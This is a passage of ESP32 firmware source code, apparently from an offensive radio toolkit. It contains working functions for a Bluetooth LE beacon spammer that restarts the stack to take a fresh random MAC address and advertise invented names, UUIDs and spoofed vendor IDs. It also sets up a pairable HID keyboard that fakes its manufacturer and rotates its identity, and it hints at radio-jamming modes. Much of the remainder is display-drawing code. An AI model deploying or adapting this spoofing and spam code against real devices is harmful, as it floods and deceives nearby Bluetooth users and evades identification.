            " reason=" + String(reason));

        if (currentRadioMode == BLE_DEVICE_STABLE) {
            bleDeviceStatus = "Visible";
            bleDeviceNeedsRedraw = true;
        }

        if (currentRadioMode == BLE_BEACON_SPAM) {
            bleBeaconNeedsRedraw = true;
        }

        NimBLEDevice::startAdvertising();
    }
} bleBeaconServerCallbacks;

bool ensureBLEPeripheralBase(const std::string& baseDeviceName = "") {
    radioLocked = true;

    radio1.stopListening();
    radio1.stopConstCarrier();
    radio1.powerDown();
    if (radio3Ok) {
        radio2.stopListening();
        radio2.stopConstCarrier();
        radio2.powerDown();
    }

    resetWiFi();

    if (!NimBLEDevice::isInitialized()) {
        if (!NimBLEDevice::init(baseDeviceName)) {
            radioLocked = false;
            return false;
        }
    } else {
        NimBLEDevice::stopAdvertising();

        NimBLEScan* scan = NimBLEDevice::getScan();
        if (scan) {
            scan->stop();
            scan->clearResults();
        }
    }

    bleBeaconServer = NimBLEDevice::getServer();
    if (!bleBeaconServer) {
        bleBeaconServer = NimBLEDevice::createServer();
        if (bleBeaconServer) {
            bleBeaconServer->setCallbacks(&bleBeaconServerCallbacks);
            bleBeaconServer->advertiseOnDisconnect(true);
        }
    } else {
        bleBeaconServer->setCallbacks(&bleBeaconServerCallbacks, false);
        bleBeaconServer->advertiseOnDisconnect(true);
    }

    bleBeaconAdvertising = NimBLEDevice::getAdvertising();

    if (!bleBeaconAdvertising) {
        radioLocked = false;
        return false;
    }

    NimBLEDevice::setPower(9);
    bleBeaconAdvertising->stop();
    bleBeaconAdvertising->enableScanResponse(true);
    bleBeaconAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
    bleBeaconAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
    bleBeaconAdvertising->setPreferredParams(0x18, 0x28);
    bleBeaconAdvertising->setAdvertisingInterval(160);

    return true;
}

bool initBLEBeaconSpammer() {
    if (bleBeaconInitialized) {
        radioLocked = true;
        return true;
    }

    bleBeaconStatus = "Init";
    bleBeaconNeedsRedraw = true;

    if (!ensureBLEPeripheralBase()) {
        bleBeaconStatus = "Error";
        return false;
    }

    if (!ensureBLEInfoBatteryServices()) {
        bleBeaconStatus = "Error";
        return false;
    }

    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    orionToolsLoadBleProfileFromSd();
    bleBeaconInitialized = true;
    bleBeaconStatus = "Ready";
    LOG("BLE beacon mode initialized");
    return true;
}

bool configurePeripheralAddress(String& modeOut, bool preferRandom = false) {
    uint8_t randomAddr[6];
    generateRandomStaticBLEAddress(randomAddr);
    NimBLEAddress ownAddr(randomAddr, BLE_ADDR_RANDOM);

    bool addrTypeOk = NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    bool addrOk = NimBLEDevice::setOwnAddr(ownAddr);

    if (addrTypeOk && addrOk) {
        modeOut = "Random";
        return true;
    }

    if (addrTypeOk) {
        modeOut = "Random Auto";
        LOG("BLE addr fallback: random auto address active");
        return true;
    }

    if (!preferRandom && NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC)) {
        modeOut = "Public";
        return true;
    }

    if (preferRandom) {
        if (NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC)) {
            modeOut = "Public Fallback";
            LOG("BLE addr fallback: public address active");
            return true;
        }
    }

    modeOut = "Error";
    LOG(String("BLE addr failed type=") + (addrTypeOk ? "true" : "false") +
        " addr=" + (addrOk ? "true" : "false"));
    return false;
}

bool configureStableBLEAddress() {
    return configurePeripheralAddress(bleDeviceAddrMode, true);
}

bool ensureBLEStableHIDDevice() {
    if (bleDeviceHid != nullptr &&
        bleDeviceInputReport != nullptr &&
        bleDeviceOutputReport != nullptr &&
        bleDeviceBootInput != nullptr &&
        bleDeviceBootOutput != nullptr) {
        return true;
    }

    bleDeviceHid = new NimBLEHIDDevice(bleBeaconServer);
    if (!bleDeviceHid) {
        LOG("BLE stable HID alloc failed");
        return false;
    }

    bleDeviceHid->setHidInfo(0x00, 0x01);
    bleDeviceHid->setReportMap(bleKeyboardReportMap, sizeof(bleKeyboardReportMap));

    bleDeviceInputReport = bleDeviceHid->getInputReport(1);
    bleDeviceOutputReport = bleDeviceHid->getOutputReport(1);
    bleDeviceBootInput = bleDeviceHid->getBootInput();
    bleDeviceBootOutput = bleDeviceHid->getBootOutput();

    if (!bleDeviceInputReport || !bleDeviceOutputReport || !bleDeviceBootInput || !bleDeviceBootOutput) {
        LOG("BLE stable HID report setup failed");
        return false;
    }

    uint8_t emptyInputReport[8] = {0};
    uint8_t emptyOutputReport = 0;
    bleDeviceInputReport->setValue(emptyInputReport, sizeof(emptyInputReport));
    bleDeviceOutputReport->setValue(&emptyOutputReport, 1);
    bleDeviceBootInput->setValue(emptyInputReport, sizeof(emptyInputReport));
    bleDeviceBootOutput->setValue(&emptyOutputReport, 1);

    return true;
}

bool refreshBLEStableIdentity() {
    if (!bleBeaconAdvertising || !bleDeviceHid) {
        bleDeviceStatus = "Error";
        return false;
    }

    bleDeviceName = generateRandomBLEName();
    bleDeviceUUID = generateRandomBLEUUID();
    bleDeviceBattery = 84 + random(0, 15);

    const BLEBeaconProfile& profile = bleBeaconProfiles[random(bleBeaconProfileCount)];
    bleDeviceVendor = profile.label;
    bleDeviceManufacturerId = profile.manufacturerId;

    bleDeviceHid->setManufacturer(bleDeviceVendor.c_str());
    bleDeviceHid->setPnp(0x01, bleDeviceManufacturerId, 0x0321, 0x0110);
    bleDeviceHid->setBatteryLevel(bleDeviceBattery);

    NimBLEAdvertisementData advData;
    NimBLEAdvertisementData scanResp;
    std::string deviceName = bleDeviceName.c_str();

    advData.setFlags(0x06);
    if (!advData.setName(deviceName)) {
        advData.clearData();
        advData.setFlags(0x06);
        advData.setShortName(deviceName.substr(0, 8));
    }
    advData.addServiceUUID("1812");
    advData.addServiceUUID("180F");
    advData.setAppearance(HID_KEYBOARD);

    scanResp.setName(deviceName);
    scanResp.addTxPower();

    bleBeaconAdvertising->stop();

    if (!configureStableBLEAddress()) {
        bleDeviceStatus = "Error";
        LOG("BLE stable address refresh failed");
        return false;
    }

    NimBLEDevice::setDeviceName(deviceName);

    bool advOk = bleBeaconAdvertising->setAdvertisementData(advData);
    bool scanOk = bleBeaconAdvertising->setScanResponseData(scanResp);

    if (!advOk || !scanOk) {
        bleDeviceStatus = "Error";
        LOG("BLE stable advertising payload rejected");
        LOG(String("BLE stable advOk=") + (advOk ? "true" : "false") +
            " scanOk=" + (scanOk ? "true" : "false"));
        return false;
    }

    logBLEAdvertisementPayload("STABLE ADV", advData);
    logBLEAdvertisementPayload("STABLE SCAN", scanResp);

    bool started = bleBeaconAdvertising->start();
    if (!started) {
        bleDeviceStatus = "Error";
        LOG("BLE stable advertising start failed");
        return false;
    }

    bleDeviceAddress = NimBLEDevice::getAddress().toString().c_str();
    bleDeviceAddress.toUpperCase();
    bleDeviceLastRotate = millis();
    bleDeviceStatus = bleBeaconServer && bleBeaconServer->getConnectedCount() > 0 ? "Connected" : "Visible";
    bleDeviceNeedsRedraw = true;

    LOG(String("BLE stable HID started name=") + bleDeviceName);
    LOG(String("BLE stable addr mode=") + bleDeviceAddrMode + " addr=" + bleDeviceAddress);
    LOG(String("BLE stable role=Keyboard vendor=") + bleDeviceVendor +
        " mfg=" + formatBLEHex16(bleDeviceManufacturerId) +
        " battery=" + String(bleDeviceBattery));

    return true;
}

bool initBLEStableDevice() {
    if (bleDeviceInitialized) {
        radioLocked = true;
        return true;
    }

    bleDeviceStatus = "Init";
    bleDeviceNeedsRedraw = true;
    bleDeviceLastRotate = 0;

    if (!ensureBLEPeripheralBase()) {
        bleDeviceStatus = "Error";
        return false;
    }

    if (!configureStableBLEAddress()) {
        bleDeviceStatus = "Error";
        return false;
    }

    NimBLEDevice::setSecurityAuth(true, false, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

    if (!ensureBLEStableHIDDevice()) {
        bleDeviceStatus = "Error";
        return false;
    }

    if (!bleBeaconServer->start()) {
        bleDeviceStatus = "Error";
        LOG("BLE stable server start failed");
        return false;
    }

    bleDeviceStartedAt = millis();
    bleDeviceInitialized = true;
    return refreshBLEStableIdentity();
}

bool ensureBLEInfoBatteryServices() {
    if (!bleBeaconServer) {
        return false;
    }

    if (!bleBeaconInfoService) {
        bleBeaconInfoService = bleBeaconServer->createService("180A");
        if (bleBeaconInfoService) {
            bleBeaconModelCharacteristic =
                bleBeaconInfoService->createCharacteristic("2A24", NIMBLE_PROPERTY::READ);
            bleBeaconVendorCharacteristic =
                bleBeaconInfoService->createCharacteristic("2A29", NIMBLE_PROPERTY::READ);
            bleBeaconSerialCharacteristic =
                bleBeaconInfoService->createCharacteristic("2A25", NIMBLE_PROPERTY::READ);
        }
    }

    if (!bleBeaconBatteryService) {
        bleBeaconBatteryService = bleBeaconServer->createService("180F");
        if (bleBeaconBatteryService) {
            bleBeaconBatteryCharacteristic =
                bleBeaconBatteryService->createCharacteristic("2A19", NIMBLE_PROPERTY::READ);
            uint8_t initialBattery = 87;
            bleBeaconBatteryCharacteristic->setValue(&initialBattery, 1);
        }
    }

    return bleBeaconModelCharacteristic != nullptr &&
        bleBeaconVendorCharacteristic != nullptr &&
        bleBeaconSerialCharacteristic != nullptr &&
        bleBeaconBatteryCharacteristic != nullptr;
}

bool initBLEBeaconTest() {
    if (bleBeaconTestInitialized) {
        radioLocked = true;
        return true;
    }

    bleBeaconTestStatus = "Init";
    bleBeaconTestNeedsRedraw = true;

    if (!ensureBLEPeripheralBase()) {
        bleBeaconTestStatus = "Error";
        return false;
    }

    if (!ensureBLEInfoBatteryServices()) {
        bleBeaconTestStatus = "Error";
        return false;
    }

    uint32_t payloadSeed = esp_random();
    const BLEBeaconProfile& profile = bleBeaconProfiles[random(bleBeaconProfileCount)];
    uint8_t batteryLevel = 76 + (payloadSeed % 20);

    bleBeaconTestName = generateRandomBLEName();
    bleBeaconTestUUID = generateRandomBLEUUID();
    bleBeaconTestVendor = profile.label;
    bleBeaconTestManufacturerId = profile.manufacturerId;
    bleBeaconTestMajor = (uint16_t)(payloadSeed >> 16);
    bleBeaconTestMinor = (uint16_t)(payloadSeed & 0xFFFF);

    if (!configurePeripheralAddress(bleBeaconTestAddrMode)) {
        bleBeaconTestStatus = "Error";
        return false;
    }

    if (bleBeaconModelCharacteristic) {
        bleBeaconModelCharacteristic->setValue(bleBeaconTestName.c_str());
    }
    if (bleBeaconVendorCharacteristic) {
        bleBeaconVendorCharacteristic->setValue(bleBeaconTestVendor.c_str());
    }
    if (bleBeaconSerialCharacteristic) {
        bleBeaconSerialCharacteristic->setValue(bleBeaconTestUUID.c_str());
    }
    if (bleBeaconBatteryCharacteristic) {
        bleBeaconBatteryCharacteristic->setValue(&batteryLevel, 1);
    }

    NimBLEBeacon beacon;
    beacon.setManufacturerId(bleBeaconTestManufacturerId);
    beacon.setProximityUUID(BLEUUID(bleBeaconTestUUID.c_str()));
    beacon.setMajor(bleBeaconTestMajor);
    beacon.setMinor(bleBeaconTestMinor);
    beacon.setSignalPower(-59);

    NimBLEAdvertisementData advData;
    NimBLEAdvertisementData scanResp;
    std::string deviceName = bleBeaconTestName.c_str();
    bool fullNameOk = false;
    bool shortNameOk = false;

    advData.setFlags(0x04);
    bool beaconDataOk = advData.setManufacturerData(beacon.getData());

    fullNameOk = scanResp.setName(deviceName);
    if (!fullNameOk) {
        scanResp.clearData();
        shortNameOk = scanResp.setShortName(deviceName.substr(0, 8));
    }
    bool txPowerOk = scanResp.addTxPower();

    bleBeaconAdvertising->stop();
    bleBeaconAdvertising->enableScanResponse(true);
    bleBeaconAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    bleBeaconAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
    NimBLEDevice::setDeviceName(deviceName);

    bool advOk = bleBeaconAdvertising->setAdvertisementData(advData);
    bool scanOk = bleBeaconAdvertising->setScanResponseData(scanResp);

    if (!beaconDataOk || !advOk || !scanOk) {
        bleBeaconTestStatus = "Error";
        LOG("BLE beacon test payload rejected");
        LOG(String("BLE beacon test beaconDataOk=") + (beaconDataOk ? "true" : "false") +
            " advOk=" + (advOk ? "true" : "false") +
            " scanOk=" + (scanOk ? "true" : "false"));
        return false;
    }

    LOG("BLE beacon test payload");
    LOG(String("BLE beacon test name=") + bleBeaconTestName);
    LOG(String("BLE beacon test vendor=") + bleBeaconTestVendor +
        " mfg=" + formatBLEHex16(bleBeaconTestManufacturerId));
    LOG(String("BLE beacon test uuid=") + bleBeaconTestUUID);
    LOG(String("BLE beacon test major=") + formatBLEHex16(bleBeaconTestMajor) +
        " minor=" + formatBLEHex16(bleBeaconTestMinor));
    LOG(String("BLE beacon test addr mode=") + bleBeaconTestAddrMode);
    LOG(String("BLE beacon test scan name full=") + (fullNameOk ? "true" : "false") +
        " short=" + (shortNameOk ? "true" : "false") +
        " txPower=" + (txPowerOk ? "true" : "false"));
    logBLEAdvertisementPayload("BEACON ADV", advData);
    logBLEAdvertisementPayload("BEACON SCAN", scanResp);

    bool started = bleBeaconAdvertising->start();
    if (!started) {
        bleBeaconTestStatus = "Error";
        LOG("BLE beacon test start failed");
        return false;
    }

    bleBeaconTestAddress = NimBLEDevice::getAddress().toString().c_str();
    bleBeaconTestAddress.toUpperCase();
    bleBeaconTestStartedAt = millis();
    bleBeaconTestRefreshCount++;
    bleBeaconTestInitialized = true;
    bleBeaconTestStatus = "Live";

    LOG(String("BLE beacon test started addr=") + bleBeaconTestAddress +
        " refreshes=" + String(bleBeaconTestRefreshCount));

    return true;
}

void rotateBLEBeaconPayload() {
    // Full deinit/reinit cycle — the only reliable way to get a new MAC
    // on ESP32 NimBLE. setOwnAddr() alone doesn't force the controller to
    // use the new address until the stack is restarted.
    if (NimBLEDevice::isInitialized()) {
        NimBLEDevice::deinit(true);
        delay(30);
    }

    if (!NimBLEDevice::init("")) {
        bleBeaconStatus = "Error";
        bleBeaconNeedsRedraw = true;
        return;
    }
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    // Fresh random static address
    uint8_t randomAddr[6];
    generateRandomStaticBLEAddress(randomAddr);
    NimBLEAddress ownAddr(randomAddr, BLE_ADDR_RANDOM);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setOwnAddr(ownAddr);

    // Rebuild peripheral base after reinit
    bleBeaconServer = nullptr;
    bleBeaconAdvertising = nullptr;
    bleBeaconInfoService = nullptr;
    bleBeaconBatteryService = nullptr;
    bleBeaconModelCharacteristic = nullptr;
    bleBeaconVendorCharacteristic = nullptr;
    bleBeaconSerialCharacteristic = nullptr;
    bleBeaconBatteryCharacteristic = nullptr;
    bleBeaconInitialized = false;

    if (!ensureBLEPeripheralBase() || !ensureBLEInfoBatteryServices()) {
        bleBeaconStatus = "Error";
        bleBeaconNeedsRedraw = true;
        return;
    }

    // New random identity
    const BLEBeaconProfile& profile = bleBeaconProfiles[random(bleBeaconProfileCount)];
    uint32_t payloadSeed = esp_random();

    bleBeaconName = generateRandomBLEName();
    bleBeaconVendor = profile.label;
    bleBeaconManufacturerId = profile.manufacturerId;
    bleBeaconUUID = generateRandomBLEUUID();
    bleBeaconMajor = (uint16_t)(payloadSeed >> 16);
    bleBeaconMinor = (uint16_t)(payloadSeed & 0xFFFF);
    uint8_t batteryLevel = 70 + (payloadSeed % 25);

    if (bleBeaconModelCharacteristic)  bleBeaconModelCharacteristic->setValue(bleBeaconName.c_str());
    if (bleBeaconVendorCharacteristic) bleBeaconVendorCharacteristic->setValue(bleBeaconVendor.c_str());
    if (bleBeaconSerialCharacteristic) bleBeaconSerialCharacteristic->setValue(bleBeaconUUID.c_str());
    if (bleBeaconBatteryCharacteristic) bleBeaconBatteryCharacteristic->setValue(&batteryLevel, 1);

    NimBLEBeacon beacon;
    beacon.setManufacturerId(bleBeaconManufacturerId);
    beacon.setProximityUUID(BLEUUID(bleBeaconUUID.c_str()));
    beacon.setMajor(bleBeaconMajor);
    beacon.setMinor(bleBeaconMinor);
    beacon.setSignalPower(-59);

    NimBLEAdvertisementData advData;
    NimBLEAdvertisementData scanResp;
    std::string deviceName = bleBeaconName.c_str();

    advData.setFlags(0x06);
    if (!advData.setName(deviceName)) {
        advData.clearData();
        advData.setFlags(0x06);
        advData.setShortName(deviceName.substr(0, 8));
    }
    advData.addServiceUUID("180A");
    advData.setAppearance(0x0080);

    scanResp.setManufacturerData(beacon.getData());
    scanResp.addTxPower();

    NimBLEDevice::setDeviceName(deviceName);
    bleBeaconAdvertising->setAdvertisementData(advData);
    bleBeaconAdvertising->setScanResponseData(scanResp);

    bool started = bleBeaconAdvertising->start();
    if (started) {
        bleBeaconBursts++;
        bleBeaconIdentityCount++;
        bleBeaconStatus = "Live";
        bleBeaconLastRotate = millis();
        bleBeaconAddress = NimBLEDevice::getAddress().toString().c_str();
        bleBeaconAddress.toUpperCase();
        bleBeaconInitialized = true;
        radioLocked = true;
    } else {
        bleBeaconStatus = "Error";
    }

    bleBeaconNeedsRedraw = true;
}

void resetBLEPeripheralState() {
    bleBeaconAdvertising = nullptr;
    bleBeaconServer = nullptr;
    bleDeviceHid = nullptr;
    bleBeaconInfoService = nullptr;
    bleBeaconBatteryService = nullptr;
    bleBeaconModelCharacteristic = nullptr;
    bleBeaconVendorCharacteristic = nullptr;
    bleBeaconSerialCharacteristic = nullptr;
    bleBeaconBatteryCharacteristic = nullptr;
    bleDeviceInputReport = nullptr;
    bleDeviceOutputReport = nullptr;
    bleDeviceBootInput = nullptr;
    bleDeviceBootOutput = nullptr;
}

void resetBLEScanEngine() {
    bleScanClient = nullptr;
    bleScanClientConfigured = false;
    bleScanCancelRequested = false;
}

void stopBLEBeaconSpammer() {
    if (bleBeaconAdvertising) {
        bleBeaconAdvertising->stop();
    } else {
        NimBLEDevice::stopAdvertising();
    }

    bleBeaconInitialized = false;
    bleBeaconFirstDraw = true;
    bleBeaconNeedsRedraw = true;
    bleBeaconLastRotate = 0;
    bleBeaconLastFrame = 0;
    bleBeaconStatus = "Idle";
    bleBeaconName = "";
    bleBeaconIdentityCount = 0;
    radioLocked = false;
}

void stopBLEStableDevice() {
    if (bleBeaconAdvertising) {
        bleBeaconAdvertising->stop();
    } else {
        NimBLEDevice::stopAdvertising();
    }

    bleDeviceInitialized = false;
    bleDeviceFirstDraw = true;
    bleDeviceNeedsRedraw = true;
    bleDeviceLastRotate = 0;
    bleDeviceStatus = "Idle";
    bleDeviceAddrMode = "";
    bleDeviceName = "";
    bleDeviceVendor = "";
    bleDeviceUUID = "";
    bleDeviceAddress = "";
    bleDeviceBattery = 87;
    bleDeviceStartedAt = 0;
    bleDeviceManufacturerId = 0;
    radioLocked = false;
}

void stopBLEBeaconTest() {
    if (bleBeaconAdvertising) {
        bleBeaconAdvertising->stop();
    } else {
        NimBLEDevice::stopAdvertising();
    }

    bleBeaconTestInitialized = false;
    bleBeaconTestFirstDraw = true;
    bleBeaconTestNeedsRedraw = true;
    bleBeaconTestStatus = "Idle";
    bleBeaconTestName = "";
    bleBeaconTestVendor = "";
    bleBeaconTestUUID = "";
    bleBeaconTestAddress = "";
    bleBeaconTestAddrMode = "";
    bleBeaconTestManufacturerId = 0;
    bleBeaconTestMajor = 0;
    bleBeaconTestMinor = 0;
    bleBeaconTestStartedAt = 0;
    bleBeaconTestRefreshCount = 0;
    radioLocked = false;
}

void drawBLEBeaconTest() {
    if (!bleBeaconTestFirstDraw && !bleBeaconTestNeedsRedraw) {
        return;
    }

    bleBeaconTestNeedsRedraw = false;

    uint16_t bgColor = ILI9341_BLACK;
    uint16_t panelColor = tft.color565(18, 18, 18);
    uint16_t panelBorder = tft.color565(76, 76, 76);
    uint16_t accent = tft.color565(236, 236, 236);
    uint16_t success = ILI9341_WHITE;
    uint16_t textSoft = tft.color565(160, 160, 160);
    uint16_t lineColor = tft.color565(52, 52, 52);
    uint16_t danger = tft.color565(180, 86, 86);

    unsigned long uptimeSec = bleBeaconTestStartedAt > 0
        ? (millis() - bleBeaconTestStartedAt) / 1000UL
        : 0;

    if (bleBeaconTestFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bgColor);
        tft.fillRoundRect(8, 28, 224, 202, 12, panelColor);
        tft.drawRoundRect(8, 28, 224, 202, 12, panelBorder);
        tft.drawFastHLine(18, 67, 204, lineColor);

        tft.setTextColor(ILI9341_WHITE);
        tft.setTextSize(2);
        tft.setCursor(18, 40);
        tft.print("BLE Beacon");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("iBeacon payload test");

        drawBLEBeaconCard(16, 78, 208, 44, "Name", accent);
        drawBLEBeaconCard(16, 130, 100, 44, "Vendor", accent);
        drawBLEBeaconCard(124, 130, 100, 44, "Major/Minor", accent);
        drawBLEBeaconCard(16, 182, 208, 44, "UUID", accent);

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(12, 240);
        tft.print("Addr");

        tft.setCursor(12, 255);
        tft.print("Meta");

        tft.setCursor(12, 270);
        tft.print("SEL refresh  LEFT back");

        bleBeaconTestFirstDraw = false;
    }

    uint16_t pillColor = bleBeaconTestStatus == "Live"
        ? success
        : (bleBeaconTestStatus == "Error" ? danger : tft.color565(90, 90, 90));
    uint16_t pillText = bleBeaconTestStatus == "Live" ? ILI9341_BLACK : ILI9341_WHITE;

    tft.fillRect(148, 36, 72, 22, panelColor);
    tft.fillRoundRect(150, 38, 68, 18, 9, pillColor);
    tft.setTextColor(pillText);
    tft.setTextSize(1);
    tft.setCursor(168, 44);
    tft.print(bleBeaconTestStatus);

    tft.fillRect(24, 96, 192, 18, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(2);
    String beaconName = bleBeaconTestName.length() > 0 ? bleBeaconTestName : "Waiting...";
    if (beaconName.length() > 16) beaconName = beaconName.substring(0, 16);
    tft.setCursor(24, 96);
    tft.print(beaconName);

    tft.fillRect(24, 144, 84, 20, tft.color565(28, 28, 28));
    tft.fillRect(24, 158, 84, 10, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(1);
    String vendorName = bleBeaconTestVendor.length() > 0 ? bleBeaconTestVendor : "Pending";
    if (vendorName.length() > 12) vendorName = vendorName.substring(0, 12);
    tft.setCursor(24, 146);
    tft.print(vendorName);
    tft.setTextColor(textSoft);
    tft.setCursor(24, 158);
    tft.print(formatBLEHex16(bleBeaconTestManufacturerId));

    tft.fillRect(132, 144, 84, 22, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(132, 146);
    tft.print(formatBLEHex16(bleBeaconTestMajor));
    tft.setCursor(132, 158);
    tft.print(formatBLEHex16(bleBeaconTestMinor));

    tft.fillRect(24, 198, 192, 10, tft.color565(28, 28, 28));
    tft.fillRect(24, 210, 192, 10, tft.color565(28, 28, 28));
    String uuidLine1 = bleBeaconTestUUID.length() > 0 ? bleBeaconTestUUID : "Waiting for payload";
    String uuidLine2 = "";
    if (uuidLine1.length() > 18) {
        uuidLine2 = uuidLine1.substring(18);
        uuidLine1 = uuidLine1.substring(0, 18);
    }
    if (uuidLine2.length() > 18) uuidLine2 = uuidLine2.substring(0, 18);
    tft.setCursor(24, 199);
    tft.print(uuidLine1);
    tft.setCursor(24, 211);
    tft.print(uuidLine2);

    tft.fillRect(52, 240, 180, 10, bgColor);
    tft.setTextColor(textSoft);
    String addrLine = bleBeaconTestAddress.length() > 0 ? bleBeaconTestAddress : "--:--:--:--:--:--";
    tft.setCursor(52, 240);
    tft.print(addrLine);

    tft.fillRect(52, 255, 180, 10, bgColor);
    tft.setCursor(52, 255);
    tft.print(bleBeaconTestAddrMode.length() > 0 ? bleBeaconTestAddrMode : "Pending");
    tft.print("  ");
    tft.print(bleBeaconTestRefreshCount);
    tft.print("x  ");
    tft.print(uptimeSec);
    tft.print("s");
}

void runBLEBeaconTest() {
    if (!initBLEBeaconTest()) {
        drawBLEBeaconTest();
        return;
    }

    drawBLEBeaconTest();
}

void drawBLEStableDevice() {
    if (!bleDeviceFirstDraw && !bleDeviceNeedsRedraw) {
        return;
    }

    bleDeviceNeedsRedraw = false;

    uint16_t bgColor = ILI9341_BLACK;
    uint16_t panelColor = tft.color565(18, 18, 18);
    uint16_t panelBorder = tft.color565(76, 76, 76);
    uint16_t accent = tft.color565(236, 236, 236);
    uint16_t success = ILI9341_WHITE;
    uint16_t textSoft = tft.color565(160, 160, 160);
    uint16_t lineColor = tft.color565(52, 52, 52);
    uint16_t danger = tft.color565(180, 86, 86);
    uint16_t cardFill = tft.color565(28, 28, 28);

    uint8_t connectedCount = bleBeaconServer ? bleBeaconServer->getConnectedCount() : 0;
    unsigned long uptimeSec = bleDeviceStartedAt > 0 ? (millis() - bleDeviceStartedAt) / 1000UL : 0;

    if (bleDeviceFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bgColor);
        tft.fillRoundRect(8, 28, 224, 202, 12, panelColor);
        tft.drawRoundRect(8, 28, 224, 202, 12, panelBorder);
        tft.drawFastHLine(18, 67, 204, lineColor);

        tft.setTextColor(ILI9341_WHITE);
        tft.setTextSize(2);
        tft.setCursor(18, 40);
        tft.print("BLE Device");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Pairable phone profile");

        drawBLEBeaconCard(16, 78, 208, 44, "Name", accent);
        drawBLEBeaconCard(16, 130, 208, 44, "Address", accent);
        drawBLEBeaconCard(16, 182, 100, 44, "Vendor", accent);
        drawBLEBeaconCard(124, 182, 100, 44, "Links", accent);

        tft.setTextColor(textSoft);
        tft.setTextSize(1);
        tft.setCursor(12, 240);
        tft.print("UUID ");
        tft.setCursor(12, 255);
        tft.print("Battery ");
        tft.setCursor(12, 270);
        tft.print("Auto 0.5s  SEL rename");
        tft.setCursor(12, 282);
        tft.print("LEFT back");

        bleDeviceFirstDraw = false;
    }

    uint16_t pillColor = bleDeviceStatus == "Visible" || bleDeviceStatus == "Connected"
        ? success
        : (bleDeviceStatus == "Error" ? danger : tft.color565(90, 90, 90));
    uint16_t pillText = (bleDeviceStatus == "Visible" || bleDeviceStatus == "Connected")
        ? ILI9341_BLACK
        : ILI9341_WHITE;

    tft.fillRect(148, 36, 72, 22, panelColor);
    tft.fillRoundRect(150, 38, 68, 18, 9, pillColor);
    tft.setTextColor(pillText);
    tft.setTextSize(1);
    tft.setCursor(160, 44);
    tft.print(bleDeviceStatus);

    tft.fillRect(24, 96, 192, 18, cardFill);
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(2);
    String stableName = bleDeviceName.length() > 0 ? bleDeviceName : "Waiting...";
    if (stableName.length() > 16) stableName = stableName.substring(0, 16);
    tft.setCursor(24, 96);
    tft.print(stableName);

    tft.fillRect(24, 148, 192, 18, cardFill);
    tft.setTextSize(1);
    String stableAddr = bleDeviceAddress.length() > 0 ? bleDeviceAddress : "--:--:--:--:--:--";
    if (stableAddr.length() > 17) stableAddr = stableAddr.substring(0, 17);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(24, 148);
    tft.print(stableAddr);

    tft.fillRect(24, 160, 192, 8, cardFill);
    tft.setTextColor(textSoft);
    tft.setCursor(24, 160);
    tft.print(bleDeviceAddrMode.length() > 0 ? bleDeviceAddrMode : "Pending");

    tft.fillRect(24, 200, 84, 10, cardFill);
    tft.setTextColor(ILI9341_WHITE);
    String stableVendor = bleDeviceVendor.length() > 0 ? bleDeviceVendor : "Device";
    if (stableVendor.length() > 12) stableVendor = stableVendor.substring(0, 12);
    tft.setCursor(24, 200);
    tft.print(stableVendor);

    tft.fillRect(132, 200, 84, 10, cardFill);
    tft.setCursor(132, 200);
    tft.print(connectedCount);
    tft.print(" link");
    if (connectedCount != 1) tft.print("s");

    tft.fillRect(52, 240, 180, 10, bgColor);
    tft.setTextColor(textSoft);
    String stableUuid = bleDeviceUUID.length() > 0
        ? bleDeviceUUID.substring(0, min((int)bleDeviceUUID.length(), 18))
        : "None";
    tft.setCursor(52, 240);
    tft.print(stableUuid);

    tft.fillRect(60, 255, 172, 10, bgColor);
    tft.setCursor(60, 255);
    tft.print(bleDeviceBattery);
    tft.print("%  Up ");
    tft.print(uptimeSec);
    tft.print("s");
}

void runBLEStableDevice() {
    if (!initBLEStableDevice()) {
        drawBLEStableDevice();
        return;
    }

    bool connected = bleBeaconServer && bleBeaconServer->getConnectedCount() > 0;
    if (!connected &&
        (bleDeviceLastRotate == 0 ||
         millis() - bleDeviceLastRotate >= bleDeviceRotateIntervalMs)) {
        bleDeviceStatus = "Refresh";
        bleDeviceNeedsRedraw = true;
        refreshBLEStableIdentity();
    }

    drawBLEStableDevice();
}

void drawBLEBeaconSpammer() {
    if (!bleBeaconFirstDraw && !bleBeaconNeedsRedraw) {
        return;
    }

    bleBeaconLastFrame = millis();
    bleBeaconNeedsRedraw = false;

    uint16_t bgColor = ILI9341_BLACK;
    uint16_t panelColor = tft.color565(18, 18, 18);
    uint16_t panelBorder = tft.color565(76, 76, 76);
    uint16_t accent = tft.color565(236, 236, 236);
    uint16_t success = ILI9341_WHITE;
    uint16_t danger = tft.color565(180, 86, 86);
    uint16_t textSoft = tft.color565(160, 160, 160);
    uint16_t lineColor = tft.color565(52, 52, 52);

    if (bleBeaconFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bgColor);
        tft.fillRoundRect(8, 28, 224, 202, 12, panelColor);
        tft.drawRoundRect(8, 28, 224, 202, 12, panelBorder);
        tft.drawFastHLine(18, 67, 204, lineColor);

        tft.setTextColor(ILI9341_WHITE);
        tft.setTextSize(2);
        tft.setCursor(18, 40);
